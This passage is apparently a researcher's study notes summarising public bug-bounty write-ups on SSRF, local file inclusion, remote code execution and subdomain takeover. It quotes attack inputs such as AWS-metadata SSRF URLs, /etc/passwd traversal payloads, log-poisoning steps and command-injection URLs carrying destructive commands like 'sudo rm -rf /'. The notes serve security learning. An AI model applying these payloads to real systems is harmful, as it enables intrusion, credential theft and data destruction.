  - After a few tests, the author realised that the "Google Sites Caja server" would only fetch Google owned resources like `https://www.google.com` or `https://www.gstatic.com`, but not any external resource like `https://www.facebook.com`. That's a strange behavior because this functionality is meant to fetch external resources so it looks like a broken feature. More interstingly, it is hard to determine whether an arbitrary URL belongs to Google or not, given the breadth of Google services.
    - Anyway the only explanation for the weird behavior of the "Google Caja server" was that the fetching was happening on the internal Google network and that is why it could noly fetch Google-owned resources but not external resources.
  - Whenever the author find an endpoint that fetched arbitrary content server-side, he always tests for SSRF.
  - Using "Google Cloud" services, it's very easy to host and run arbitrary code on Google servers. The author created a "Google APP Engine" instance and hosted a javascript file. He then used the URL of this javascript file on "Google Sites" as an external script resource. The javascript was successfully fetched and parsed by "Google Caja server". The author checked his "Google App Engine" instance logs to see from where the resource was fetched, it came frome `10.x.x.201`, a private network IP.
  - The author used the private IP as the URL for the "Google Sites" javascript exteranal resource. The request took more than 30 seconds to complete. When "Google Caja" replied, he saw 1MB infromation comming from a `10.x.x.x` IP from Google internal network, it was private information from Google.
  - The author didn't scan Google's internal network. He only made 3 requests in the network to confirm the vulnerability and immediately sent a report to "Google VRP".
    - The first request was to  `http://10.x.x.201/`. It respond with a server status monitoring page of a "Borglet".
    - The second request was to `http://10.x.x.1/` and it was also a monitoring page for another "Borglet".
    - The third request was to `http://10.x.x.1/getstatus`, a different status monitoring page of a "Borglet" with more details on the jobs like permissions, arguments.

    - The author could control the destination of the URL, by changing `http%3A%2F%2Fprod.mail.bf1.yahoo.com%2F` to `http%3Amysite.com`. A request from Yahoo owned server made to his server, and included all of Yahoo header in the request.
    - This is vulnerable to internal scanning as well, `http://127.0.0` didn't work, but `http://::80` worked, this is ivp6, bypassed the `127.0.0.1` check.
  - I think this is an open redirection lead to SSRF.

  - "Yahoo Guesthouse" is a set of administration tools use by Yahoo on a daily basis. They allow Yahoo administrators to control all aspects of the Yahoo network, from mail and hosting accounts to server settings and hosting management. Certain parts of the system, such as error reporting tools, are also available to Yahoo's customer services team.
  - The auhor found a subdomain `https://alpha.keyserver.yahoo.com/`, when opened it got "Not Found" response. So he did "dirsearch" and found a SAML endpoint `https://alpha.keyserver.yahoo.com/saml` that redirected him to the "Yahoo Guesthouse" login page. The author couldn't break the SAML, but he decided to stay and dig more and mor in this.
  - When the author checked the request in burp, he found something special in the GET request for the above endpoint. There was a cookie `BouncerSAMLRemoteSessionHost=bouncer12-os.gh.bf2.yahoo.com;`, the cookie value was a website / yahoo subdomain, so ther was a high chance for an SSRF here. The auhor added his own server IP address in the `BouncerSAMLRemoteSessionHost` cookie, then received a request from `dip2.gq1.yahoo.com`.
  - The author tried to read files or escalate this SSRF but he couldn't. But SSRF in cookie seems intersting.

  - The author found some endpoints in a JS file.
  - A a bit of fuzzing, he discovered an error message on `https://www.airbnb.com/chat.asdf` that reminded him "LivePerson" he tested in the past. There was an open redirect in "LivePerson": `http://sales.liveperson.net/hc/5198728/?cmd=file&file=visitorWantsToChat&onlineURL=//xss.buer.haus/ssrftest&site=5198728`.
  - After going throught the API docs, the author discovered that `visitorWantsToChat` action would cause a header redirect with request parameter `onlineURL`, so open rediret to SSRF: `https://www.airbnb.com/chat?cmd=file&file=visitorWantsToChat&onlineURL=https://xss.buer.haus/ssrf&site=5198728` (why is this a SSRF).
  - The author didn't reveal many details, just study the method.
- [SSRF to LFI](https://seanmelia.wordpress.com/2015/12/23/various-server-side-request-forgery-issues/) by seanmelia
  - The first SSRF allowed the author to view local files on the host as well as port scan internal hosts. He read `/etc/passwd` using file protocol and brute-forced for `/porc/self/fd/{number}` (log files) using "Burpsuite Intruder".
  - The second SSRF had some filtering of `127.0.0.1` and `localhost` which was bypassed by using `0.0.0.0`.
  - The author didn't explain in details.
- [SSRF to pivot internal network](https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf) by seanmelia
  - The author noticed the `js.example.com` site was loadng some external json for the `help.example.com` site: 
    - `http://js.examplecom/redacted/proxy?c=subdomain1&r=/jsonpfile.jsonp?token=undefined`
  - The author changed the `r` parameter to another external resourc: `http://google.com`, the error message showed the site tried to load `http://subdomain1.private.comhttp://google.com`. He figured he might as well change the `c` parameter from `subdomain1` to `www`, then the site reached Google.
  - He then used file protocol to read local files: `c=www&r=file:///etc/password`.
  - Localhost also worked: `c=www&r=http://127.0.0.1`.
  - The author used "Burpsuite Intruder" to brute-force subdomains, then used this SSRF to access some datastores: `c=www&r=http://subdomain2.private.com/`.
  - I think the author went over.

- [ESEA Server-Side Request Forgery and Querying AWS Meta Data](https://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/) by Brett Buerhaus
  - The author used "Google dork" (example: `site:https://play.esea.net/ ext:php`) for recon and found an endpoint `https://play.esea.net/global/media_preview.php?url=`. It looks like an endpint for loading external images and displaying it back to the client.
    - That means there was a good chance they were taking user iput (`url` param), loading the response content, and rendering it back to the user.
  - The author tried `https://play.esea.net/global/media_preview.php?url=http://ziot.org/`, but it didn't work.
    - Looking through the Google search results again, he realized that all the results were for images. So wen can make an assumption this was built specifically for rendering only images. We can also guess that they may have implemented some form of URL / file validation to prevent file inclusion or rendering dangerous URLs.
    - Google logo: `https://play.esea.net/global/media_preview.php?url=http://www.google.com/images/logo.png`, worked.
    - His own server: `https://play.esea.net/global/media_preview.php?url=http://ziot.org/1.png`, worked.
  - The author guessed it may check file extensions (parse file extension from the URL) and maybe going a bit farther by validating the file type on their server.
    - Some typical tricks about file extension was "null-byte (`%00`)", "additional forward slashes (`/`)" and "question marks (`?`)".
    - Tried `https://play.esea.net/global/media_preview.php?url=http://ziot.org/?.png`, worked.
  - Now there was definitely SSRF, but how limited is it?
    - The first obvious thing was that this was vulnerable to XSS. We could force it to load an html file with a Javascript payload and it would execute within the context of esea's domain.
    - The next thing the author tried was other protocols, but none of them worked (the author showed other protocols he tried, this maybe could use as proc in other scene).
    - The last triky was to query "AWS metadata". By querying `http://169.254.169.254/`, you are able to pull information about the "AWS instances" such as the private address, hostname, public keys, subnet ids, and more. Probably the most shocking data you can pull is IAM role secret keys giving you API access to that AWS account.
- [Plotly AWS EC2 Metadata Disclosure via SSRF and a Stored XSS via Presentation Link)](https://ysx.me.uk/a-pair-of-plotly-bugs-stored-xss-and-aws-metadata-ssrf/) by Yasin Soliman
  - SSRF disclosed "AWS metadat":

  - During the author's reconnaissance of military websites as part of the Department of Defense's vulnerability disclousure, he noticed two particular websites were using "Jira", a popular issue tracking web application. Later, he noticed a tweet discussing SSRF being actively exploited in "Jira". After reading about this, he immediately revisited the two "Jira" instances.
  - Tried `https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com`, worked.
  - "AWS metadata":
    - local host name: `http://169.254.169.254/latest/meta-data/local-hostname/`, worked.
    - credential for their AWS instance: `http://169.254.169.254/latest/meta-data/iam/security-credential`, didn't worked.
    - other sensitive data (private IP, accout ID, server information, etc): `http://169.254.169.254/latest/dynamic/instance-identity/document`, worked.
  - The author immediately stopped all testing and sent a report. The company initially marked the report as medium severity vulnerability, but he felt that this was critical issue given what he could do so far. With permission in hand, he got to work on pivoting and exploiting the endpoint to it's fullest extent.
  - Scanned the local host port to see if there's any protocols he could invoke.
    - 21(FTP) / 22(SSH) / 80(Web) / 443(SSL Web) / 8080(Proxy)
    - What made testing this endpoint quite easy was the fact he could see various errors occurring that can help him probe their server and network.
  - I don't understand the rest part of this writeup.
- [How i converted SSRF TO XSS in jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158) by Ashish Kunwar
  - The author was very much into Bug Bounty and he spent his whole day doing this finding new and interesting stuff and kept on upgrading his recon techniques.
  - The author chosed a random site and got a lot of subdomains. He specifically looked for any "Jira" environment and found one.
  - He followed the previous writeup to manage to get any sensitive info, but he could only do `plugins/servlet/oauth/users/icon-uri?consumerUri=https://google.com`.
  - The author then replaced `https://google.com` with `http://brutelogic.com.br/poc.svg` and got XSS.
    - `http://brutelogic.com.br/poc.svg` could be used as a XSS proc in some similar scene.
- [How I found XSS via SSRF vulnerability](https://medium.com/@adeshkolte/how-i-found-xss-via-ssrf-vulnerability-adesh-kolte-873b30a6b89f) by Adesh Kolte
  - After reading the previous two writeups, the author used "Google dork" to find some outdated "Jira" instances to practice.
  - Nothing new here.
- [GETTING READ ACCESS ON EDMODO PRODUCTION SERVER BY EXPLOITING SSRF](https://www.shawarkhan.com/2018/05/getting-read-access-on-edmodo.html) by SHAWAR KHAN
  - While exploring Edmodo's services and dubdomains, the author came across a subdomain `partnerships.edmodo.com`. This domain had a registration area where publisher could register by submitting a form. Using Burpsuite, the author found that while writing data to the from a POST requst was being sent to the following URL:
    - `https://partnerships.edmodo.com/wp-content/themes/edmodo-developers/form-proxy.php?url=https://www.edmodo.com/index/ajax-check-in-db`
    - Seemed like the `form-proxy.php` was somehow sending data to the file `ajax-check-in-db`.
  - The author tried replacing `url` parameter value to `http://my-ip-address`, worked, he got a GET request to his server.
  - Using `http://127.0.0.1:80`, didn't worked.
  - Tried `http://localhost:22`, negative response, indicated this proc worked.
    - Tried "SMTP service" (`http://localhost:25`), worked, grabbed the SMTP banner.
    - The author was able to do an internal port scan and grabbed banners of ohter services.
  - The author ran another Burpsuite Intruder and detected different schemes being  used, he found `Gopher`. "SMTP" can be exploited if we have "Gropher protocol" enabled.
    - The author showed the proc to exploit "SMTP".
  - There were other schemes available as well such as "ftp" and some other. Used "file" scheme to read files on their server:
    - Tried `file:///etc/hosts`, worked.
    - Tried `file:///etc/passwd`, didn't work, there might be some kind of firewall.
    - Tried `file:///etc/./passwd`, worked.

### File Inclusion

#### Local File Inclusion (LFI)

- [CVV #1: Local File Inclusion](https://medium.com/bugbountywriteup/cvv-1-local-file-inclusion-ebc48e0e479a) by SI9INT
  - This writeup showed some useful methods when expanding a "LFI" to a "RCE".
    - Path Truncation / Nullbyte Injection / (/proc/self) / PHP wrapper / Log poisoning / PHP Sessions / phpinfo() / E-Mail
- [LFI to Command Execution: Deutche Telekom Bug Bounty](https://medium.com/@maxon3/lfi-to-command-execution-deutche-telekom-bug-bounty-6fe0de7df7a6) by Daniel Maksimovic
  - The author did subdomain bruteforce on telekom.de to see if there were new subdomains. After running `aquatone`, `dnsenum`, `recon-ng` and `sublist3r`, he collected all of the subdomains and removed duplicates, created a simple bash script to iterate over them and run `dirb` on every subdomain.
  - The author saw one subdomain had `info.php` page available (he just loves "php", developer usually mess up something, and leave some doors for hackers to come in). After opening page he was greeted with login page.
  - It was time to fire up BurpSuite and do some spidering. Few seconds later nice URL showed in burp: `https://netweb.telekom.de/netweb/gui/help.php?HELPFILE=logon.hlp`. The author replaced `logon.hlp` with `../../../../../../../../etc/passwd`, LFI.
  - There is a list of files you could use as the proc of LFI.
  - Time to execute some command. The author choose `error.log` poisoning option. The previous `info.php` showed the location of `error.log` file, and made his job a lot easier, all the locations from "SecList LFI list" gave 0 hits on the `error.log` file location.
    - `https://netweb.telekom.de/netweb/gui/help.php?HELPFILE=../../../../../../../../../../../../../pkg/moip/netinfo/logs/apache-netweb-P/error.log`
  - While running `dirb` on host the author found file `soap.php`, that showed some errors that ended inside `error.log`, and one of the data inside log was "referer value".
    - A simple test (the proc is worth to study) to see if "referer value" is executed.
- ["Journey from LFI to RCE"-How I was able to get the same in one of the India’s popular property buy/sell company](https://medium.com/bugbountywriteup/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899) by Avinash Jain
  - The author found LFI in the target site: `https://www.victimsite.com/forum/attachment-serve?name=../../../../../../../../../../etc/shadow&path=`. (How did the author find this LFI?)
  - Escalate LFI to get RCE: get access to some file may be "log files" which could provide some user controller input (in order to run some command).
  - The author tried reading "access logs", "error logs", different location to access them. But it seems the user with which he got LFI didn't have access to these logs.
  - Did more researching, the author came to know that `/proc/self/fd` provides symbolic shortcut to "access logs" and various other system related file. So he ran intruder over `/proc/self/fd/{number}` and one of the fd files provided him access to "access logs".
  - The "referer header" in the "access log" caught the author's attention because he knew that it was something which is under user controlled input. Time to execute some command. He added "referer header" in the HTTP request and set its value tp "system(id)".
  - The proc in this writeup is worth to study.
- [LFI to RCE via access_log injection](https://medium.com/@p4c3n0g3/lfi-to-rce-via-access-log-injection-88684351e7c0) by NoGe
  - A trick from "Loacal File Inclusion" / "File Path Traversal" to "Remote Code Execution" by injecting the "access_log".
  - `http://proqualitycontrol.com/index.php?page=aboutus` is vulnerable to LFR / FPT. Payload: `../../../../../../../../../../../../../../../etc/passwd%00`
  - Changed with `/etc/httpd/conf/httpd.conf` (not all `httpd.conf` is here, to find the "access_log" location you need to find `httpd.conf` first).
  - Opened the file called "access_log", in this case `/home/pro_99/proqualitycontrol.com/access_log`.
  - There is a perl script to inject the "access_log". The author also showed how to check if we've successfully injected the "access_log".
  - Then time to execute command on server: `/home/pro_99/proqualitycontrol.com/access_log%00&cmd=id`.
  - The author didn't say what server (server type can be found in the response header).

  - The author found a request URL containing `filename=AML129.jpgi` and in the response header the "Server" was "Microsoft-IIS/8.5". So LFI.
  - There is a list of files you could use as the proc of LFI.
  - By this vulnerability, the author was able to read source code of the application, sensitive files like webconfig where he got APIs key of mail server, sms, payment gateway etc, and further he was able to use these mail server key to send mail from their enterprise mail server and were even able to send sms using the sms keys to their customers.
- [GETTING PHP CODE EXECUTION AND LEVERAGE ACCESS TO PANELS,DATABASES,SERVER](https://www.shawarkhan.com/2018/06/getting-php-code-execution-and-leverage.html) by SHAWAR KHAN
  - At first, the author enumerated all the public subdomains of target application but there wasn't much subdomains found and most of them were static. So he moved to "host discovery phase" using "Shodan" and "Censys".
  - A quick search by domain name on "Censys" and found subdomain `server1.redacted.com` which returned "403 Forbidden" when visited over http. By simply applying "google dorks" and searching on some engines, the author found that this subdomain was not indexed and nothing returned any kind of contents that he could make use of. Then he did "dirsearch" and found that the server blocked the IP after every 10 requests (he could add some delays and use some proxies to bypass this IP based protection but that won't do the trick as he had to do an intense enumeration over that target, so that won't be the trick).
  - So as everything had failed, the only way left was to check for their snapshots and sitemap that was cached by "wayback (archive.org)" web archive. This trick worked every time for the author and mostly got backups and stuff on servers when there is a deadend like this one.
    - The author used "wayback" web archive to get a list URL of the target applcition, this method is worth to study.
  - When accessed `files.php` it returned some PHP error a "error_reporting" was turned on.
  - "undefined index" means it was using a specifc index which was not passed which in this case was the url parameter. So the author added url parameter indicatd by "undefined index" with random value.
  - The exploitation inspired by the error message need some knowladge of PHP. I don't understand the rest part of this writeup.

#### Remode File Incusion (RFI)

### Simple Remote Code Execution (Simple RCE)

- [Command Injection in Google Console](http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html) by Venkat S
  - Actually, this was a "client side command injection" about "Google Cloud Shell".
  - `https://console.cloud.google.com/home/dashboard?project="name of the project"`:
    - Tested for IDOR: `https://console.cloud.google.com/home/dashboard?project="Random project name"`, not vulnerable to IDOR, but reflected the name of project in "Cloud Shell"
    - Tested for XSS: `https://console.cloud.google.com/home/dashboard?project="XSS vector"`, not vulnerable to XSS, but on activating "Cloud Shell" there was some syntax error.
    - `https://console.cloud.google.com/home/dashboard?project=;`, there was no syntax error, and "Cloud Shell" created successfully.
    - In Linux, we can chain commands in various ways, the one way is by using semi-colon operator. e.g. `apt-get update; apt-get upgrade`
    - So, `https://console.cloud.google.com/home/dashboard?project=;ping google.com` and `https://console.cloud.google.com/home/dashboard?project=;cat /etc/passwd`, both worked well.
    - At this point, te author could inject commands which affects his own vm but not Google servers.
  - Crashed victim's vm: `https://console.cloud.google.com/home/dashboard?project=;sudo cp /dev/zero /dev/mem`, once victim access this URL and click "Activate cloud shell", his / her vm crashes.
  - Deleted victim's files: `https://console.cloud.google.com/home/dashboard?project=;sudo rm -rf /`, this will delete victims root directory which also deletes appengine files.
  - This vulnerability existed in bash script created in client side (javascript), it affected:
    - `https://console.cloud.google.com`
    - `https://console.developer.google.com`
- [Secure your Jenkins instance or hackers will force you to](http://nahamsec.com/secure-your-jenkins-instance-or-hackers-will-force-you-to/) by Ben Sadeghipour
  - The author showed how he preformed his recon by looking at Slack and Snapchat's bug bounty programs.
  - How to find some interesting subdomains on `censys.io` that wouldn't have been able to find by brute forcing.
  - `REDACTED-jenkins-Environment.sc-corp.net` pointed the user to login in order to see what's on that site. At this point, the author wondered if there's a prod environment, there's got to be more. Then the author used script that would look for different permutations of `REDACTED-jenkins-$env.sc-corp.net` with the following list: `dev, alpha, stage, prod, beta, local, test`. As expected a few of those returned with 302 as their response code, which hinted that they maybe behind a login.
  - The author went to the `prod` instance and tried to login, however that didn't work. So he moved down the list and tried the same method on the other instances. Luckily, one of the instances allowed him to login to the Jenkins instance using a gmail account. Once logged in, the author could access the "Script Console".
  - At this point, the author ran a script that allowed him to read a file on the server and immediately stopped further testing and reported it to the Snapchat team.
  - Some examples for exploiting "Jenkins":
    - Usually having access to builds on Jenkins could possibly give you access to credentials, api_keys / secrets, and obviously the source code.
    - Jenkins allows you to setup different plugins such as "Github OAuth" where you are able to allow users to login using your organization which could expose your "Github token", which can be used to access more data using the "Github API".
    - The "Script Console" allows you to read files using one line of code (the author gives a proc), you can also execute a command (the author gives a proc).
  - Takeaways:
    - Jenkins allows you to have different user permissions. That means just because you have authenticated to the Jenkins instance, it doesn't guarantee you with Remote Command Execution.
    - Don't let it scare you away if it requires authentication via Github or Google OAuth.
    - Don't spam programs with "publicly accessible Jenkins" reports unless you can possibly exploit one or more of the above examples.
- [RCE Unsecure Jenkins Instance](https://blog.securitybreached.org/2018/09/07/rce-jenkins-instance-dosomething-org-bug-bounty-poc/) by Muhammad Khizer Javed
  - The author was checking subdomains of a site and found a subdomain `jenkins-thor.dosomething.org`. By name he got that it must be a Jenkins Instance so he open that subdomain and got redirected to Github Login Page.
  - The author logged in Jenkins Instance using his Github account, then he had complete admin access to the Jenkins Instance.
- [From finding Jenkins instance to Command Execution](https://medium.com/@logicbomb_1/bugbounty-from-finding-jenkins-instance-to-command-execution-secure-your-jenkins-instance-9bd1e75c2288) by Avinash Jain
  - The author ususally uses `https://censys.io` to find public server IPs.
  - When the author searched the targeted domain, he found an instance running on 8080 prot, the server name was "Jetty". This gave him a glimpse that it might have Jenkins running on it (usually because it's running on a standard port 80 / 443 / 8080 / 8443 on Jetty).
  - The author further checked the IP (also on `https://censys.io`) for more details and it was indeed Jenkins running there.
  - This Jenkins Instance was publically accessible and it didn't have any authentication. The author could act like an admin.
  - Some dashboards of Jenkins:
    - /asynchPeople/ - it gives access to view all the people having access of Jenkins Instance.
    - /credential/ - it gives access to view credential ids, names.
    - /configure/ - it is a configuration management dashboard for Jenkins.
    - /configureSecurity/ - configuration management for security settings.
    - /script/ - script console to run commands.

- [Hostile Subdomain Takeover using Heroku/Github/Desk + more](https://labs.detectify.com/2014/10/21/hostile-subdomain-takeover-using-herokugithubdesk-more/) by detectify
  - Attack scenario:
    - Your company starts using a new service, e.g. an external "support ticketing service".
    - Your company points a subdomain to the "support ticketing service", e.g. `support.your-domain.com`.
    - Your company stops using this service but does not remove the subdomain redirection pointing to the "ticketing system".
    - Attackers signs up for the "service" and claims the domain as theirs. No verification is done by the "service provider", and the DNS-setup is already correctly setup.
    - Attacker can now build complete clone of the real site, add a login form, redirect the user, steal credential (e.g. admin accounts), cookies and / or completely destroy business credibility for your company.
- [Hijacking of abandoned subdomains part 2](https://labs.detectify.com/2014/12/08/hijacking-of-abandoned-subdomains-part-2/) by detectify
  - Since the registration of `msnbrickyardsweeps.com` has expired, the author could buy it and suddenly `racing.msn.com` starts showing his content since `racing.msn.com` has a CNAME record pointing to `msnbrickyardsweeps.com`.
  - MX records are fetched from the CNAME, so `racing.msn.com` gets the same MX records as `msnbrickyardsweeps.com`. Now you could set up email accounts with `@racing.msn.com` and receive all emails sent to this domain.
- [Subdomain Takeover: Basics](https://0xpatrik.com/subdomain-takeover-basics/) by Patrik Hudak
  - Subdomain takeover is a process of registering a non-existing domain name to gain control over another domain. The most common scenario:
    - Domain name (e.g. `sub.example.com`) uses a CNAME record to another domain (e.g. `sub.example.com` CNAME `anotherdomain.com`).
    - At some point in time, `anotherdomain.com` expires and is available for registration by anyone.
    - Since the CNAME record is not deleted from `example.com` DNS zone, anyone who registers `anotherdomain.com` has full control over `sub.example.com` until the DNS record is present.
  - Subdomain takeover is not limited to CNAME records. NS, MX and even A record are affected as well.
  - Using a subdomain takeover, attackers can send phishing emails from legistimate domain, perform XSS, or damage the reputation of the brand which is associated with the domain.
  - The concept of "CNAME subdomain takeover" / "NS subdomain takeover" / "MX subdomain takeover".
  - Something about "Cloud Providers".
  - Something about "Amazon CloudFront".
  - Other cloud services which work very similarly to "Amazon CloudFront": "Amazon S3" / "Heroku" / "Shopify" / "GitHub" / "Microsoft Azure".
- [Subdomain Takeover: Going beyond CNAME](https://0xpatrik.com/subdomain-takeover-ns/) by Patrik Hudak
  - The author talked something about NS subdomain takeover.
- [Subdomain Takeover: Thoughts on Risks](https://0xpatrik.com/subdomain-takeover/) by Patrik Hudak
  - Transparency to a browser.
  - SSL certificates.
  - Cookie stealing.
  - Emails.
  - Higher order risks.
  - Mitigation:
    - Remove the affected DNS record.
    - Claim the domain name.
- [Subdomain Takeover: Proof Creation for Bug Bounties](https://0xpatrik.com/takeover-proofs/) by Patrik Hudak
  - The author explained how to verity whether subdomain takeover is possible and showed a step-by-step instruction for PoC creation.
    - "Amazon S3" / "Github Pages" /  "Heroku" / "Readme.io"
  - Eventhough `aquatone` provide nice heuristics about possible subdomain takeover, they sometimes contain false positives due to several restrictions given by the individual cloud provider.
- [Subdomain Takeover: Starbucks points to Azure](https://0xpatrik.com/subdomain-takeover-starbucks/) by Patrik Hudak
  - The domain `svcgatewayus.starbucks.com` pointed to a non-existing resource in "Microsoft Azure".
  - The author explained how to verity whether subdomain takeover is possible and showed a step-by-step instruction for PoC creation on about "Microsoft Azure".
- [Subdomain Takeover: Yet another Starbucks case](https://0xpatrik.com/subdomain-takeover-starbucks-ii/) by Patrik Hudak

- [Subdomain Takeover: Finding Candidates](https://0xpatrik.com/subdomain-takeover-candidates/) by Patrik Hudak
  - The author got automation in place, it usually takes just a few minutes to create PoC and write a report.
  - The very first thing need to understand is that subdomain takeover monitoring is a continuous process. Domains are often working perfectly, but once the administartor removes the resource where CNAME is pointing, the vulnerability is introduced.
    - In the previous example, the domain was fully working for several months. It became "vulnerable" at some point in time. 20 minutes after, the author already got working PoC.
  - The author described how he built his automation (though his code won't be released).
- [Subdomain Takeover: Identifying Providers](https://0xpatrik.com/subdomain-takeover-providers/) by Patrik Hudak
  - The author got a list of "domain suffixes" used by "cloud provider", he explained how to process this list correctly and how to identify new vulnerable cloud services using simple methods.
- [Subdomain Takeover: Second Order Bugs](https://0xpatrik.com/second-order-bugs/) by Patrik Hudak
  - The author tried to extend his "autonomous bug bounty finding engine". His first thought was to incorporate second order bugs into the subdomain takeover sanning process. He described how he approached this challenge and how this process can be automated efficiently.
    - Second order bugs happen when a website uses a "takeoverable domain" in the wrong place.
- [How I took over a Uber subdomain by doing recon - how I got lucky](https://medium.com/bugbountywriteup/4500-bounty-how-i-got-lucky-99d8bc933f75) by Eray Mitrani
  - The author used `aquatone` to identify the vulnerable subdomain. Luckily he encountered the vulnerable domain the first day.
  - After running `aquatone-takeover-domain {{target}}.com`, he saw a domain vulnerable to takeover on AWS Cloudfront. At first he wasn't excited because most of the time you get a CNAME already in use error when trying to claim a subdomain. However to his great surprise the company had forgotten to remove the CNAME and he was able to claim it.
- [Reading Uber’s Internal Emails - Uber Bug Bounty report worth $10,000](http://web.archive.org/web/20180902023519/http://blog.pentestnepal.tech/post/149985438982/reading-ubers-internal-emails-uber-bug-bounty) by whitehatnepal
  - After recent finding about one of the Uber's subdomain takeover was publicly disclosed, the author looked into Uber to find similar bug. `em.uber.com` also had CNAME pointing to "SendGrid" and could be vulnerable to similar kind of issue.
  - The author had limited experience using "SendGrid", so he signed up on "SendGrid", a transactional and marketing email service used by uber, to see what was possible.
  - He looked around to understand how to claim a domain through "SendGrid". He could not edit contents of the domain, like hackers would normally do to demonstrate a subdomain hijacking, because it wasn't possible through "SendGrid".
    - There was an option calle "while-label", which would allow emails to be sent through a verified domain and this caught his eye.
  - Meanwhile, the author forgot his Uber account's password. So, he reset it and realized that the reset email Uber sent had reply email set to `@em.uber.com`. So, he knew that MX record for `em.uber.com` was being used somehow.
    - A quick look into MX through `dnsgoodies.com` showed that MX was pointing to `mx.sendgrid.net`.
  - After he figured that he could play arount with MX records for Uber subdomains, he started to research more about "SendGrid" workflow. He realized that he could claim `em.uber.com` in the "Inbound Parse Webhook", a medium for email interception, which wasn't yet claimed by Uber.
    - He looked around for API and found a python program wwitten by "SendGrid" which could be used in "Inbound Parse Webhook".
    - He tweaked the program so that it would display the email in his terminal.
    - Then he ran the python web application, which would setup a local http server on port 5000.
    - He used "ngrok" to tunnel that to a web address to that "Inbound Parse" could get a receiver domain where it could send POST requests.
  - Soon, the author was able to receive emails in `em.uber.com`.
  - This was also true with all of Uber's subdomain. One of them was `www.uber.com`, which was also used in "sentry" (a crash reporter) plugin. This allowed him to receive "sentry" logs from `www.uber.com` because they were sent as email. This was a significant information disclosure for Uber.
  - Fixed: Uber claimed the domain; "SendGrid" added extra verification which forces you to have a verified domain before adding a "Inbound Parse Webhook".
- [How I snooped into your private Slack messages - Slack Bug bounty worth $2,500](http://web.archive.org/web/20180902030648/http://blog.pentestnepal.tech/post/150381068912/how-i-snooped-into-your-private-slack-messages) by uranium238
  - When researching about MX records of `slack.com`, the author noticed that they used a 3rd party email service. In that service, however `slack.com` was already claimed.
  - After a little more research, he found that all the sub-domains of `slack.com` like `teamname.slack.com` also had MX set to the same service. These team domains were not claimed, so the emails for these domains could also be intercepted.
    - What is the major issue with this? Could you send a message to your team from an email?
  - To do further research on the question and gather relevant information, the author looked for any way that these emails were being used by "Slack".
    - While browsing the "HackerOne page" for "Slack", he noticed that they stated about the "email app" that could be used as a way to send a message to a channel throuth the email.
    - This service however was only applicable to member plans "Standard" and above. So he upgraded his plan to "Standard" and started to research on it.
  - After he installed the "email app" on his channel he was provided with an email in the form `{hashedtext}@uraniumsecteam.slack.com` (the `{hashedtext}` was randomly generated to make sure they cannot be enumerated because someone could use that to spam the channel).
    - The email had `uraniumsecteam.slack.com` as the email domain, it had MX, which could be claimed.
    - He proceeded with the plan and set the route in a way that all emails coming to `@uraniumsecteam.slack.com` would arrive to his inbox.

  - "Shopify" is a cloud service provider that allows you to create an e-commerce website in a super easy way.
  - The author gave two web pages on "Shopify" that you could do a "Subdomain Takeover".
  - You can do a Subdomain Takeover on "Shopify" with two types of DNS records:
    - Mapping with application name (CNAMEs pointing to `myshopname.myshopify.com`).
    - Mapping with DNS (CNAMEs pointing to `shops.myshopify.com`).
  - The second Type of DNS records (CNAMEs pointing to `shops.myshopify.com`) could be used to identify large scale Subdomain Takeover on Shopify.
  - The author showed how we can check if a shop name was claimed or not.
- [Netlify - Subdomain Takeover worth 200$](https://medium.com/@alirazzaq/subdomain-takeover-worth-200-ed73f0a58ffe) by Ali Razzaq
  - "Netlify" is platform for web developers to upload their web projects and showcase to world. "Netlify" allow web developers to add custom domain or subdomain to their projects.
  - The author used `findsubdomains.com` to get some subdomains. He found one when open it just showing "Not Found".
  - He just checked the CNAME record of this subdomain (because CNAME would tell you on which 3rd party site the subdomain was mapped). He got the CNAME `hootsuite-directory.netlify.com`.
  - He registered on `netlify.com` and upload the web project, then it asked him to add custom subdomain, he added `hootsuite-directory.netlify.com`. Done.
- [Hundreds of hundreds sub-secdomains hack3d! (including Hacker0ne)](https://medium.com/bugbountywriteup/hundreds-of-hundreds-subdomains-hack3d-including-hacker0ne-ad3acd1c0a44) by Ak1T4
  - The author looked to takeover some subdomains at "HackerOne", he found one that took his attention, was `info.hacker.one` (was this subdomain special?). The DNS was pointing to `unbouncespages.com`, a landing pages app services. Looking at the API he tried to add the "HackerOne" domain, but when he tried the output was "domain is already claimed".
  - He tried to find another way to bypass this (claimed domain could bypass?). For hours looking endpoints, trying with different requests and changing some params, he could hack & bypass the filter domain (?), this hack gave him the power to add any domain managed by the DNS of `unbouncespages.com`.
  - Looking "unbouncespages servers", the author decide to do a "Reverse Dns" to `54.225.142.127` and saw which others domains could be compromised with this bypass. Hundreds.
  - Unlike other subdomain takeover vulnerabilities which the company didn't claim the domain, this was a vulnerability in `unbouncespages.com` that attackers could claim any domain.
- [Authentication bypass on Uber’s Single Sign-On via subdomain takeover](https://www.arneswinnen.net/2017/06/authentication-bypass-on-ubers-sso-via-subdomain-takeover/) by Arne Swinnen
  - Uber was vulnerable to subdomain takeover on `saostatic.uber.com` via "Amazon CloudFront CDN". Moreover, Uber's recently deployed "Single Sign-On (SSO)" system at `auth.uber.com`, which is based on shared cookies between all `*.uber.com` subdomains, was found vulnerable to session cookie theft by any compromised `*.uber.com` subdomain. Therefore, the impact of the subdomain takeover could be increased to "Authentication Bypass" of Uber's full SSO system, yielding access to all `*.uber.com` subdomains protected by it.
  - Generally, SSO systems are (variations of) any of the following three types, in order of popularity:
    - OAuth: Security is mainly based on whitelisted callback URLs of "service providers" configured at the "identity providers", and CSRF protection via the `state` parameter. Flaws are often via "open redirect chains".
    - SAML & friends: Security is based on XML messages signed with pre-exchanged cryptographic keys between service and "identity providers". Flaws are often "XML Signature bypasses".
    - Shared (session) cookies between subdomains: Security is based on the integrity of all subdomains. Any vulnerability on any subdomain that provides an attacker insight in the shared session cookies issued by the SSO system is fatal. Flaw are thus often RCE, debug logs exposure, subdomain takevoer and friends on subdomains.
  - The exploit is complicated.
